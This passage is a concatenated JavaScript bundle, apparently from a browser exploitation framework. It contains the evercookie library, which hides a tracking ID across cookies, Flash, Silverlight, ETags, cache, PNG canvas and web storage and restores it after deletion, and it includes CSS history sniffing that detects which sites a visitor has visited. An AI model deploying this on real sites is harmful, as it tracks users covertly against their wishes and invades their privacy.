b=0;b<a.length;b++)a[b]()||a.splice(b--,1);a.length||d.fx.stop()},interval:13,stop:function(){clearInterval(cc),cc=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){d.style(a.elem,"opacity",a.now)},_default:function(a){a.elem.style&&a.elem.style[a.prop]!=null?a.elem.style[a.prop]=(a.prop==="width"||a.prop==="height"?Math.max(0,a.now):a.now)+a.unit:a.elem[a.prop]=a.now}}}),d.expr&&d.expr.filters&&(d.expr.filters.animated=function(a){return d.grep(d.timers,function(b){return a===b.elem}).length});var cg=/^t(?:able|d|h)$/i,ch=/^(?:body|html)$/i;"getBoundingClientRect"in c.documentElement?d.fn.offset=function(a){var b=this[0],c;if(a)return this.each(function(b){d.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return d.offset.bodyOffset(b);try{c=b.getBoundingClientRect()}catch(e){}var f=b.ownerDocument,g=f.documentElement;if(!c||!d.contains(g,b))return c?{top:c.top,left:c.left}:{top:0,left:0};var h=f.body,i=ci(f),j=g.clientTop||h.clientTop||0,k=g.clientLeft||h.clientLeft||0,l=i.pageYOffset||d.support.boxModel&&g.scrollTop||h.scrollTop,m=i.pageXOffset||d.support.boxModel&&g.scrollLeft||h.scrollLeft,n=c.top+l-j,o=c.left+m-k;return{top:n,left:o}}:d.fn.offset=function(a){var b=this[0];if(a)return this.each(function(b){d.offset.setOffset(this,a,b)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return d.offset.bodyOffset(b);d.offset.initialize();var c,e=b.offsetParent,f=b,g=b.ownerDocument,h=g.documentElement,i=g.body,j=g.defaultView,k=j?j.getComputedStyle(b,null):b.currentStyle,l=b.offsetTop,m=b.offsetLeft;while((b=b.parentNode)&&b!==i&&b!==h){if(d.offset.supportsFixedPosition&&k.position==="fixed")break;c=j?j.getComputedStyle(b,null):b.currentStyle,l-=b.scrollTop,m-=b.scrollLeft,b===e&&(l+=b.offsetTop,m+=b.offsetLeft,d.offset.doesNotAddBorder&&(!d.offset.doesAddBorderForTableAndCells||!cg.test(b.nodeName))&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),f=e,e=b.offsetParent),d.offset.subtractsBorderForOverflowNotVisible&&c.overflow!=="visible"&&(l+=parseFloat(c.borderTopWidth)||0,m+=parseFloat(c.borderLeftWidth)||0),k=c}if(k.position==="relative"||k.position==="static")l+=i.offsetTop,m+=i.offsetLeft;d.offset.supportsFixedPosition&&k.position==="fixed"&&(l+=Math.max(h.scrollTop,i.scrollTop),m+=Math.max(h.scrollLeft,i.scrollLeft));return{top:l,left:m}},d.offset={initialize:function(){var a=c.body,b=c.createElement("div"),e,f,g,h,i=parseFloat(d.css(a,"marginTop"))||0,j="<div style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;'><div></div></div><table style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;' cellpadding='0' cellspacing='0'><tr><td></td></tr></table>";d.extend(b.style,{position:"absolute",top:0,left:0,margin:0,border:0,width:"1px",height:"1px",visibility:"hidden"}),b.innerHTML=j,a.insertBefore(b,a.firstChild),e=b.firstChild,f=e.firstChild,h=e.nextSibling.firstChild.firstChild,this.doesNotAddBorder=f.offsetTop!==5,this.doesAddBorderForTableAndCells=h.offsetTop===5,f.style.position="fixed",f.style.top="20px",this.supportsFixedPosition=f.offsetTop===20||f.offsetTop===15,f.style.position=f.style.top="",e.style.overflow="hidden",e.style.position="relative",this.subtractsBorderForOverflowNotVisible=f.offsetTop===-5,this.doesNotIncludeMarginInBodyOffset=a.offsetTop!==i,a.removeChild(b),d.offset.initialize=d.noop},bodyOffset:function(a){var b=a.offsetTop,c=a.offsetLeft;d.offset.initialize(),d.offset.doesNotIncludeMarginInBodyOffset&&(b+=parseFloat(d.css(a,"marginTop"))||0,c+=parseFloat(d.css(a,"marginLeft"))||0);return{top:b,left:c}},setOffset:function(a,b,c){var e=d.css(a,"position");e==="static"&&(a.style.position="relative");var f=d(a),g=f.offset(),h=d.css(a,"top"),i=d.css(a,"left"),j=(e==="absolute"||e==="fixed")&&d.inArray("auto",[h,i])>-1,k={},l={},m,n;j&&(l=f.position()),m=j?l.top:parseInt(h,10)||0,n=j?l.left:parseInt(i,10)||0,d.isFunction(b)&&(b=b.call(a,c,g)),b.top!=null&&(k.top=b.top-g.top+m),b.left!=null&&(k.left=b.left-g.left+n),"using"in b?b.using.call(a,k):f.css(k)}},d.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),c=this.offset(),e=ch.test(b[0].nodeName)?{top:0,left:0}:b.offset();c.top-=parseFloat(d.css(a,"marginTop"))||0,c.left-=parseFloat(d.css(a,"marginLeft"))||0,e.top+=parseFloat(d.css(b[0],"borderTopWidth"))||0,e.left+=parseFloat(d.css(b[0],"borderLeftWidth"))||0;return{top:c.top-e.top,left:c.left-e.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||c.body;while(a&&(!ch.test(a.nodeName)&&d.css(a,"position")==="static"))a=a.offsetParent;return a})}}),d.each(["Left","Top"],function(a,c){var e="scroll"+c;d.fn[e]=function(c){var f=this[0],g;if(!f)return null;if(c!==b)return this.each(function(){g=ci(this),g?g.scrollTo(a?d(g).scrollLeft():c,a?c:d(g).scrollTop()):this[e]=c});g=ci(f);return g?"pageXOffset"in g?g[a?"pageYOffset":"pageXOffset"]:d.support.boxModel&&g.document.documentElement[e]||g.document.body[e]:f[e]}}),d.each(["Height","Width"],function(a,c){var e=c.toLowerCase();d.fn["inner"+c]=function(){return this[0]?parseFloat(d.css(this[0],e,"padding")):null},d.fn["outer"+c]=function(a){return this[0]?parseFloat(d.css(this[0],e,a?"margin":"border")):null},d.fn[e]=function(a){var f=this[0];if(!f)return a==null?null:this;if(d.isFunction(a))return this.each(function(b){var c=d(this);c[e](a.call(this,b,c[e]()))});if(d.isWindow(f)){var g=f.document.documentElement["client"+c];return f.document.compatMode==="CSS1Compat"&&g||f.document.body["client"+c]||g}if(f.nodeType===9)return Math.max(f.documentElement["client"+c],f.body["scroll"+c],f.documentElement["scroll"+c],f.body["offset"+c],f.documentElement["offset"+c]);if(a===b){var h=d.css(f,e),i=parseFloat(h);return d.isNaN(i)?h:i}return this.css(e,typeof a==="string"?a:a+"px")}}),a.jQuery=a.$=d})(window);

//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*
 * evercookie 0.4 (10/13/2010) -- extremely persistent cookies
 *
 *  by samy kamkar : code@samy.pl : http://samy.pl
 *
 * this api attempts to produce several types of persistent data
 * to essentially make a cookie virtually irrevocable from a system
 *
 * specifically it uses:
 *  - standard http cookies
 *  - flash cookies (local shared objects)
 *  - silverlight isolated storage
 *  - png generation w/forced cache and html5 canvas pixel reading
 *  - http etags
 *  - http cache
 *  - window.name
 *  - IE userData
 *  - html5 session cookies
 *  - html5 local storage
 *  - html5 global storage
 *  - html5 database storage via sqlite
 *  - css history scanning
 *
 *  if any cookie is found, it's then reset to all the other locations
 *  for example, if someone deletes all but one type of cookie, once
 *  that cookie is re-discovered, all of the other cookie types get reset
 *
 *  !!! SOME OF THESE ARE CROSS-DOMAIN COOKIES, THIS MEANS
 *  OTHER SITES WILL BE ABLE TO READ SOME OF THESE COOKIES !!!
 *
 * USAGE:

	var ec = new evercookie();	
	
	// set a cookie "id" to "12345"
	// usage: ec.set(key, value)
	ec.set("id", "12345");
	
	// retrieve a cookie called "id" (simply)
	ec.get("id", function(value) { alert("Cookie value is " + value) });

	// or use a more advanced callback function for getting our cookie
    // the cookie value is the first param
    // an object containing the different storage methods
	// and returned cookie values is the second parameter
    function getCookie(best_candidate, all_candidates)
    {
        alert("The retrieved cookie is: " + best_candidate + "\n" +
        	"You can see what each storage mechanism returned " +
			"by looping through the all_candidates object.");

		for (var item in all_candidates)
			document.write("Storage mechanism " + item +
				" returned " + all_candidates[item] + " votes<br>");
    }
    ec.get("id", getCookie);

	// we look for "candidates" based off the number of "cookies" that
	// come back matching since it's possible for mismatching cookies.
	// the best candidate is very-very-likely the correct one
	
*/

/* to turn off CSS history knocking, set _ec_history to 0 */
var _ec_history = 1; // CSS history knocking or not .. can be network intensive
var _ec_tests = 10;//1000;
var _ec_debug = 0;

function _ec_dump(arr, level)
{
	var dumped_text = "";
	if(!level) level = 0;
	
	//The padding given at the beginning of the line.
	var level_padding = "";
	for(var j=0;j<level+1;j++) level_padding += "    ";
	
	if(typeof(arr) == 'object') { //Array/Hashes/Objects 
		for(var item in arr) {
			var value = arr[item];
			
			if(typeof(value) == 'object') { //If it is an array,
				dumped_text += level_padding + "'" + item + "' ...\n";
				dumped_text += _ec_dump(value,level+1);
			} else {
				dumped_text += level_padding + "'" + item + "' => \"" + value + "\"\n";
			}
		}
	} else { //Stings/Chars/Numbers etc.
		dumped_text = "===>"+arr+"<===("+typeof(arr)+")";
	}
	return dumped_text;
}

function _ec_replace(str, key, value)
{
	if (str.indexOf('&' + key + '=') > -1 || str.indexOf(key + '=') == 0)
	{
		// find start
		var idx = str.indexOf('&' + key + '=');
		if (idx == -1)
			idx = str.indexOf(key + '=');

		// find end
		var end = str.indexOf('&', idx + 1);
		var newstr;
		if (end != -1)
			newstr = str.substr(0, idx) + str.substr(end + (idx ? 0 : 1)) + '&' + key + '=' + value;
		else
			newstr = str.substr(0, idx) + '&' + key + '=' + value;

		return newstr;
	}
	else
		return str + '&' + key + '=' + value;
}


// necessary for flash to communicate with js...
// please implement a better way
var _global_lso;
function _evercookie_flash_var(cookie)
{
	_global_lso = cookie;

	// remove the flash object now
	var swf = $('#myswf');
	if (swf && swf.parentNode)
		swf.parentNode.removeChild(swf);
}

var evercookie = (function () {
this._class = function() {

var self = this;
// private property
_baseKeyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
this._ec = {};
var no_color = -1;

this.get = function(name, cb, dont_reset)
{
	$(document).ready(function() {
		self._evercookie(name, cb, undefined, undefined, dont_reset);
	});
}

this.set = function(name, value)
{
	$(document).ready(function() {
			self._evercookie(name, function() { }, value);
	});
}

this._evercookie = function(name, cb, value, i, dont_reset)
{
	if (typeof self._evercookie == 'undefined')
		self = this;
	
	if (typeof i == 'undefined')
		i = 0;

	// first run
	if (i == 0)
	{
		self.evercookie_database_storage(name, value);
		self.evercookie_png(name, value);
		self.evercookie_etag(name, value);
		self.evercookie_cache(name, value);
		self.evercookie_lso(name, value);
		self.evercookie_silverlight(name, value);

		self._ec.userData		= self.evercookie_userdata(name, value);
		self._ec.cookieData		= self.evercookie_cookie(name, value);
		self._ec.localData		= self.evercookie_local_storage(name, value);
		self._ec.globalData		= self.evercookie_global_storage(name, value);
		self._ec.sessionData	= self.evercookie_session_storage(name, value);
		self._ec.windowData		= self.evercookie_window(name, value);
	
		if (_ec_history)
			self._ec.historyData = self.evercookie_history(name, value);
	}

	// when writing data, we need to make sure lso and silverlight object is there
	if (typeof value != 'undefined')
	{
		if (
            (
                (typeof _global_lso == 'undefined') ||
                (typeof _global_isolated == 'undefined')
            )
            && i++ < _ec_tests
        )
			setTimeout(function() { self._evercookie(name, cb, value, i, dont_reset) }, 300);
	}
	
	// when reading data, we need to wait for swf, db, silverlight and png
	else
	{
		if (
			(
				// we support local db and haven't read data in yet
				(window.openDatabase && typeof self._ec.dbData == 'undefined') ||
				(typeof _global_lso == 'undefined') ||
				(typeof self._ec.etagData == 'undefined') ||
				(typeof self._ec.cacheData == 'undefined') ||
				(document.createElement('canvas').getContext && (typeof self._ec.pngData == 'undefined' || self._ec.pngData == '')) ||
                (typeof _global_isolated == 'undefined')
			)
			&&
			i++ < _ec_tests
		)
		{
			setTimeout(function() { self._evercookie(name, cb, value, i, dont_reset) }, 300);
		}

		// we hit our max wait time or got all our data
		else
		{
			// get just the piece of data we need from swf
			self._ec.lsoData = self.getFromStr(name, _global_lso);
			_global_lso = undefined;
            
			// get just the piece of data we need from silverlight
			self._ec.slData = self.getFromStr(name, _global_isolated);
			_global_isolated = undefined;

			var tmpec = self._ec;
			self._ec = {};
			
			// figure out which is the best candidate
			var candidates = new Array();
			var bestnum = 0;
			var candidate;
			for (var item in tmpec)
			{
				if (typeof tmpec[item] != 'undefined' && typeof tmpec[item] != 'null' && tmpec[item] != '' &&
				  tmpec[item] != 'null' && tmpec[item] != 'undefined' && tmpec[item] != null)
				{
						candidates[tmpec[item]] = typeof candidates[tmpec[item]] == 'undefined' ? 1 : candidates[tmpec[item]] + 1;
				}
			}
			
			for (var item in candidates)
			{
				if (candidates[item] > bestnum)
				{
					bestnum = candidates[item];
					candidate = item;
				}
			}
			
			// reset cookie everywhere
			if (typeof dont_reset == "undefined" || dont_reset != 1)
				self.set(name, candidate);

			if (typeof cb == 'function')
				cb(candidate, tmpec);
		}
	}
}

this.evercookie_window = function(name, value)
{
	try {
		if (typeof(value) != "undefined")
			window.name = _ec_replace(window.name, name, value);
		else
			return this.getFromStr(name, window.name);
	} catch(e) { }
}

this.evercookie_userdata = function(name, value)
{
	try {
		var elm = this.createElem('div', 'userdata_el', 1);
		elm.style.behavior = "url(#default#userData)";

		if (typeof(value) != "undefined")
		{
			elm.setAttribute(name, value);
			elm.save(name);
		}
		else
		{
			elm.load(name);
			return elm.getAttribute(name);
		}
	} catch(e) { }
}

this.evercookie_cache = function(name, value)
{
	if (typeof(value) != "undefined")
	{
		// make sure we have evercookie session defined first
		document.cookie = 'evercookie_cache=' + value;
		
		// evercookie_cache.php handles caching
		var img = new Image();
		img.style.visibility = 'hidden';
		img.style.position = 'absolute';
		img.src = 'evercookie_cache.php?name=' + name;
	}
	else
	{
		// interestingly enough, we want to erase our evercookie
		// http cookie so the php will force a cached response
		var origvalue = this.getFromStr('evercookie_cache', document.cookie);
		self._ec.cacheData = undefined;
		document.cookie = 'evercookie_cache=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

		$.ajax({
			url: 'evercookie_cache.php?name=' + name,
			success: function(data) {
				// put our cookie back
				document.cookie = 'evercookie_cache=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.cacheData = data;
			}
		});
	}
}

this.evercookie_etag = function(name, value)
{
	if (typeof(value) != "undefined")
	{
		// make sure we have evercookie session defined first
		document.cookie = 'evercookie_etag=' + value;
		
		// evercookie_etag.php handles etagging
		var img = new Image();
		img.style.visibility = 'hidden';
		img.style.position = 'absolute';
		img.src = 'evercookie_etag.php?name=' + name;
	}
	else
	{
		// interestingly enough, we want to erase our evercookie
		// http cookie so the php will force a cached response
		var origvalue = this.getFromStr('evercookie_etag', document.cookie);
		self._ec.etagData = undefined;
		document.cookie = 'evercookie_etag=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

		$.ajax({
			url: 'evercookie_etag.php?name=' + name,
			success: function(data) {
				// put our cookie back
				document.cookie = 'evercookie_etag=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.etagData = data;
			}
		});
	}
}

this.evercookie_lso = function(name, value)
{
    var div = document.getElementById('swfcontainer');
	if (!div)
	{
		div = document.createElement("div");
		div.setAttribute('id', 'swfcontainer');
		document.body.appendChild(div);
	}

	var flashvars = {};
	if (typeof value != 'undefined')
		flashvars.everdata = name + '=' + value;

	var params           = {};
	params.swliveconnect = "true";
	var attributes       = {};
	attributes.id        = "myswf";
	attributes.name      = "myswf";
	swfobject.embedSWF("evercookie.swf", "swfcontainer", "1", "1", "9.0.0", false, flashvars, params, attributes);
}

this.evercookie_png = function(name, value)
{
	if (document.createElement('canvas').getContext)
	{
		if (typeof(value) != "undefined")
		{
			// make sure we have evercookie session defined first
			document.cookie = 'evercookie_png=' + value;
			
			// evercookie_png.php handles the hard part of generating the image
			// based off of the http cookie and returning it cached
			var img = new Image();
			img.style.visibility = 'hidden';
			img.style.position = 'absolute';
			img.src = 'evercookie_png.php?name=' + name;
		}
		else
		{
			self._ec.pngData = undefined;
			var context = document.createElement('canvas');
			context.style.visibility = 'hidden';
			context.style.position = 'absolute';
			context.width = 200;
			context.height = 1;
			var ctx = context.getContext('2d');
			
			// interestingly enough, we want to erase our evercookie
			// http cookie so the php will force a cached response
			var origvalue = this.getFromStr('evercookie_png', document.cookie);
			document.cookie = 'evercookie_png=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';

			var img = new Image();
			img.style.visibility = 'hidden';
			img.style.position = 'absolute';
			img.src = 'evercookie_png.php?name=' + name;
			
			img.onload = function()
			{
				// put our cookie back
				document.cookie = 'evercookie_png=' + origvalue + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';

				self._ec.pngData = '';
				ctx.drawImage(img,0,0);

				// get CanvasPixelArray from  given coordinates and dimensions
				var imgd = ctx.getImageData(0, 0, 200, 1);
				var pix = imgd.data;

				// loop over each pixel to get the "RGB" values (ignore alpha)
				for (var i = 0, n = pix.length; i < n; i += 4)
				{
					if (pix[i  ] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i]);
					if (pix[i+1] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i+1]);
					if (pix[i+2] == 0) break;
					self._ec.pngData += String.fromCharCode(pix[i+2]);
				}
			}	
		}
	}
}

this.evercookie_local_storage = function(name, value)
{
	try
	{
		if (window.localStorage)
		{
			if (typeof(value) != "undefined")
				localStorage.setItem(name, value);
			else
				return localStorage.getItem(name);
		}
	}
	catch (e) { }
}

this.evercookie_database_storage = function(name, value)
{
	try
	{
		if (window.openDatabase)
		{		
			var database = window.openDatabase("sqlite_evercookie", "", "evercookie", 1024 * 1024);

			if (typeof(value) != "undefined")
				database.transaction(function(tx)
				{
					tx.executeSql("CREATE TABLE IF NOT EXISTS cache(" +
						"id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, " +
						"name TEXT NOT NULL, " +
						"value TEXT NOT NULL, " +
						"UNIQUE (name)" + 
					")", [], function (tx, rs) { }, function (tx, err) { });

					tx.executeSql("INSERT OR REPLACE INTO cache(name, value) VALUES(?, ?)", [name, value],
						function (tx, rs) { }, function (tx, err) { })
				});
			else
			{
				database.transaction(function(tx)
				{
					tx.executeSql("SELECT value FROM cache WHERE name=?", [name],
					function(tx, result1) {
						if (result1.rows.length >= 1)
							self._ec.dbData = result1.rows.item(0)['value'];
						else
							self._ec.dbData = '';
					}, function (tx, err) { })
				});
			}
		}
	} catch(e) { }
}

this.evercookie_session_storage = function(name, value)
{
	try
	{
		if (window.sessionStorage)
		{
			if (typeof(value) != "undefined")
				sessionStorage.setItem(name, value);
			else
				return sessionStorage.getItem(name);
		}
	} catch(e) { }
}

this.evercookie_global_storage = function(name, value)
{
	if (window.globalStorage)
	{
		var host = this.getHost();

		try
		{
			if (typeof(value) != "undefined")
				eval("globalStorage[host]." + name + " = value");
			else
				return eval("globalStorage[host]." + name);
		} catch(e) { }
	}
}
this.evercookie_silverlight = function(name, value) {
    /*
     * Create silverlight embed
     * 
     * Ok. so, I tried doing this the proper dom way, but IE chokes on appending anything in object tags (including params), so this
     * is the best method I found. Someone really needs to find a less hack-ish way. I hate the look of this shit.
    */
        var source = "evercookie.xap";
        var minver = "4.0.50401.0";
        
        var initParam = "";
        if(typeof(value) != "undefined")
            initParam = '<param name="initParams" value="'+name+'='+value+'" />';
        
        var html =
        '<object data="data:application/x-silverlight-2," type="application/x-silverlight-2" id="mysilverlight" width="0" height="0">' +
            initParam +
            '<param name="source" value="'+source+'"/>' +
            '<param name="onLoad" value="onSilverlightLoad"/>' +
            '<param name="onError" value="onSilverlightError"/>' +
            '<param name="background" value="Transparent"/>' +
            '<param name="windowless" value="true"/>' +
            '<param name="minRuntimeVersion" value="'+minver+'"/>' +
            '<param name="autoUpgrade" value="true"/>' +
            '<a href="http://go.microsoft.com/fwlink/?LinkID=149156&v='+minver+'" style="text-decoration:none">' +
              '<img src="http://go.microsoft.com/fwlink/?LinkId=108181" alt="Get Microsoft Silverlight" style="border-style:none"/>' +
            '</a>' +
        '</object>';
        document.body.innerHTML+=html;
}

// public method for encoding
this.encode = function (input) {
	var output = "";
	var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
	var i = 0;

	input = this._utf8_encode(input);

	while (i < input.length) {

		chr1 = input.charCodeAt(i++);
		chr2 = input.charCodeAt(i++);
		chr3 = input.charCodeAt(i++);

		enc1 = chr1 >> 2;
		enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
		enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
		enc4 = chr3 & 63;

		if (isNaN(chr2)) {
			enc3 = enc4 = 64;
		} else if (isNaN(chr3)) {
			enc4 = 64;
		}

		output = output +
		_baseKeyStr.charAt(enc1) + _baseKeyStr.charAt(enc2) +
		_baseKeyStr.charAt(enc3) + _baseKeyStr.charAt(enc4);

	}

	return output;
}

// public method for decoding
this.decode = function (input) {
	var output = "";
	var chr1, chr2, chr3;
	var enc1, enc2, enc3, enc4;
	var i = 0;

	input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

	while (i < input.length) {
		enc1 = _baseKeyStr.indexOf(input.charAt(i++));
		enc2 = _baseKeyStr.indexOf(input.charAt(i++));
		enc3 = _baseKeyStr.indexOf(input.charAt(i++));
		enc4 = _baseKeyStr.indexOf(input.charAt(i++));

		chr1 = (enc1 << 2) | (enc2 >> 4);
		chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
		chr3 = ((enc3 & 3) << 6) | enc4;

		output = output + String.fromCharCode(chr1);

		if (enc3 != 64) {
			output = output + String.fromCharCode(chr2);
		}
		if (enc4 != 64) {
			output = output + String.fromCharCode(chr3);
		}

	}

	output = this._utf8_decode(output);

	return output;

}

// private method for UTF-8 encoding
this._utf8_encode = function (string) {
	string = string.replace(/\r\n/g,"\n");
	var utftext = "";

	for (var n = 0; n < string.length; n++) {

		var c = string.charCodeAt(n);

		if (c < 128) {
			utftext += String.fromCharCode(c);
		}
		else if((c > 127) && (c < 2048)) {
			utftext += String.fromCharCode((c >> 6) | 192);
			utftext += String.fromCharCode((c & 63) | 128);
		}
		else {
			utftext += String.fromCharCode((c >> 12) | 224);
			utftext += String.fromCharCode(((c >> 6) & 63) | 128);
			utftext += String.fromCharCode((c & 63) | 128);
		}

	}

	return utftext;
}

// private method for UTF-8 decoding
this._utf8_decode = function (utftext) {
	var string = "";
	var i = 0;
	var c = c1 = c2 = 0;

	while ( i < utftext.length ) {

		c = utftext.charCodeAt(i);

		if (c < 128) {
			string += String.fromCharCode(c);
			i++;
		}
		else if((c > 191) && (c < 224)) {
			c2 = utftext.charCodeAt(i+1);
			string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
			i += 2;
		}
		else {
			c2 = utftext.charCodeAt(i+1);
			c3 = utftext.charCodeAt(i+2);
			string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
			i += 3;
		}

	}

	return string;
}

// this is crazy but it's 4am in dublin and i thought this would be hilarious
// blame the guinness
this.evercookie_history = function(name, value)
{
	// - is special
	var baseStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=-";
	var baseElems = baseStr.split("");
	
	// sorry google.
	var url = 'http://www.google.com/evercookie/cache/' + this.getHost() + '/' + name;

	if (typeof(value) != "undefined")
	{
		// don't reset this if we already have it set once
		// too much data and you can't clear previous values
		if (this.hasVisited(url))
			return;

		this.createIframe(url, 'if');
		url = url + '/';

		var base = this.encode(value).split("");
		for (var i = 0; i < base.length; i++)
		{
			url = url + base[i];
			this.createIframe(url, 'if' + i);
		}

		// - signifies the end of our data
		url = url + '-';
		this.createIframe(url, 'if_');
	}
	else
	{
		// omg you got csspwn3d
		if (this.hasVisited(url))
		{
			url = url + '/';

			var letter = "";
			var val = "";
			var found = 1;
			while (letter != '-' && found == 1)
			{
				found = 0;
				for (var i = 0; i < baseElems.length; i++)
				{
					if (this.hasVisited(url + baseElems[i]))
					{
						letter = baseElems[i];
						if (letter != '-')
							val = val + letter;
						url = url + letter;
						found = 1;
						break;
					}
				}
			}
			
			// lolz
			return this.decode(val);
		}
	}
}

this.createElem = function(type, name, append)
{
	var el;
	if (typeof name != 'undefined' && document.getElementById(name))
		el = document.getElementById(name);
	else
		el = document.createElement(type);
	el.style.visibility = 'hidden';
	el.style.position = 'absolute';

	if (name)
		el.setAttribute('id', name);

	if (append)
		document.body.appendChild(el);

	return el;
}

this.createIframe = function(url, name)
{
	var el = this.createElem('iframe', name, 1);
	el.setAttribute('src', url);
	return el;
}

// wait for our swfobject to appear (swfobject.js to load)
this.waitForSwf = function(i)
{
	if (typeof i == 'undefined')
		i = 0;
	else
		i++;

	// wait for ~2 seconds for swfobject to appear
	if (i < _ec_tests && typeof swfobject == 'undefined')
		setTimeout(function() { waitForSwf(i) }, 300);
}

this.evercookie_cookie = function(name, value)
{
	if (typeof(value) != "undefined")
	{
		// expire the cookie first
		document.cookie = name + '=; expires=Mon, 20 Sep 2010 00:00:00 UTC; path=/';
		document.cookie = name + '=' + value + '; expires=Tue, 31 Dec 2030 00:00:00 UTC; path=/';
	}
	else
		return this.getFromStr(name, document.cookie);
}

// get value from param-like string (eg, "x=y&name=VALUE")
this.getFromStr = function(name, text)
{
	if (typeof text != 'string')
		return;
		
	var nameEQ = name + "=";
	var ca = text.split(/[;&]/);
	for (var i = 0; i < ca.length; i++)
	{
		var c = ca[i];
		while (c.charAt(0) == ' ')
			c = c.substring(1, c.length);
		if (c.indexOf(nameEQ) == 0)
			return c.substring(nameEQ.length, c.length);
	}
}

this.getHost = function()
{
	var domain = document.location.host;
	if (domain.indexOf('www.') == 0)
		domain = domain.replace('www.', '');
	return domain;
}

this.toHex = function(str)
{
    var r = "";
    var e = str.length;
    var c = 0;
    var h;
    while (c < e)
    {
        h = str.charCodeAt(c++).toString(16);
        while (h.length < 2)
        	h = "0" + h;
        r += h;
    }
    return r;
}

this.fromHex = function(str)
{
    var r = "";
    var e = str.length;
    var s;
    while (e >= 0)
    {
        s = e - 2;
        r = String.fromCharCode("0x" + str.substring(s, e)) + r;
        e = s;
    }
    return r;
}

/* 
 * css history knocker (determine what sites your visitors have been to)
 *
 * originally by Jeremiah Grossman
 * http://jeremiahgrossman.blogspot.com/2006/08/i-know-where-youve-been.html
 *
 * ported to additional browsers by Samy Kamkar
 *
 * compatible with ie6, ie7, ie8, ff1.5, ff2, ff3, opera, safari, chrome, flock
 *
 * - code@samy.pl
 */


this.hasVisited = function(url)
{
	if (this.no_color == -1)
	{
		var no_style = this._getRGB("http://samy-was-here-this-should-never-be-visited.com", -1);
		if (no_style == -1)
			this.no_color =
				this._getRGB("http://samy-was-here-"+Math.floor(Math.random()*9999999)+"rand.com");
	}
	
	// did we give full url?
	if (url.indexOf('https:') == 0 || url.indexOf('http:') == 0)
		return this._testURL(url, this.no_color);
		
	// if not, just test a few diff types	if (exact)
	return	this._testURL("http://" + url, this.no_color) ||
		this._testURL("https://" + url, this.no_color) ||
		this._testURL("http://www." + url, this.no_color) ||
		this._testURL("https://www." + url, this.no_color);
}

/* create our anchor tag */
var _link = this.createElem('a', '_ec_rgb_link');

/* for monitoring */
var created_style;

/* create a custom style tag for the specific link. Set the CSS visited selector to a known value */
var _cssText = '#_ec_rgb_link:visited{display:none;color:#FF0000}';

/* Methods for IE6, IE7, FF, Opera, and Safari */
try {
	created_style = 1;
	var style = document.createElement('style');
	if (style.styleSheet)
		style.styleSheet.innerHTML = _cssText;
	else if (style.innerHTML)
		style.innerHTML = _cssText;
	else
	{
		var cssT = document.createTextNode(_cssText);
		style.appendChild(cssT);
	}
} catch (e) {
	created_style = 0;
}

/* if test_color, return -1 if we can't set a style */
this._getRGB = function(u, test_color)
{
	if (test_color && created_style == 0)
		return -1;

	/* create the new anchor tag with the appropriate URL information */
	_link.href = u;
	_link.innerHTML = u;
	// not sure why, but the next two appendChilds always have to happen vs just once
	document.body.appendChild(style);
	document.body.appendChild(_link);
	
	/* add the link to the DOM and save the visible computed color */
	var color;
	if (document.defaultView)
		color = document.defaultView.getComputedStyle(_link, null).getPropertyValue('color');
	else
		color = _link.currentStyle['color'];

	return color;
}

this._testURL = function(url, no_color)
{
	var color = this._getRGB(url);

	/* check to see if the link has been visited if the computed color is red */
	if (color == "rgb(255, 0, 0)" || color == "#ff0000")
		return 1;

	/* if our style trick didn't work, just compare default style colors */
	else if (no_color && color != no_color)
		return 1;

	/* not found */
	return 0;
}

};

return _class;
})();


/*
 * Again, ugly workaround....same problem as flash.
*/
var _global_isolated;
function onSilverlightLoad(sender, args) {
    var control = sender.getHost();
    _global_isolated = control.Content.App.getIsolatedStorage();
}
/*
function onSilverlightError(sender, args) {
    _global_isolated = "";
    
}*/
function onSilverlightError(sender, args) {
    _global_isolated = "";
}


/*
    https://github.com/douglascrockford/JSON-js/blob/master/json2.js
    2011-02-23

// Create a JSON object only if one does not already exist. We create the
// methods in a closure to avoid creating global variables.
*/

var JSON;
if (!JSON) {
    JSON = {};
}

(function () {
    "use strict";

    function f(n) {
        // Format integers to have at least two digits.
        return n < 10 ? '0' + n : n;
    }

    if (typeof Date.prototype.toJSON !== 'function') {

        Date.prototype.toJSON = function (key) {

            return isFinite(this.valueOf()) ?
                this.getUTCFullYear()     + '-' +
